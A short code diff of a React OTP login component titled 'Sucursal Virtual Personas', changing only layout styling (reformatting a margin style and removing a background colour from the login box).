@@ -572,7 +572,11 @@ export default function NumeroOTP() {
                     />
                 </div>
 
-                <div style={{ marginTop: "25px" }}>
+                <div
+                    style={{
+                        marginTop: "25px",
+                    }}
+                >
                     <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
                         Sucursal Virtual Personas
                     </h1>
@@ -580,7 +584,6 @@ export default function NumeroOTP() {
 
                 <div className="login-page">
                     <div className="login-box" style={{
-                        backgroundColor: "#2C2A29",
                         maxWidth: "600px",
                         padding: "40px",
                         position: "relative",
